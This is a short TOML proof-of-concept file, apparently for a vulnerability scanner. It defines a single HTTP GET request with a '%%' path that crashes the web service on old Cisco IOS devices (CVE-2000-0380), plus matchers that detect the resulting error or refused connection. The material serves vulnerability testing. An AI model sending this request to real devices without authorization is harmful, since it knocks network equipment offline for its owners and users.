[info]
author = "ave"
description = "向 Cisco IOS 11.1-12.1 设备的 HTTP 服务发送包含 %% 的特制 URL 请求，可导致 HTTP 服务崩溃，造成拒绝服务。"
id = "POC-AVE-2000-0315"
name = "Cisco IOS HTTP %% 拒绝服务漏洞 PoC"
severity = "high"
tags = ["ave-2000-0315"]
vuln_id = [
    "CVE-2000-0380",
    "AVE-2000-0315",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/%%"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "500",
    "Service Unavailable",
    "connection refused",
]
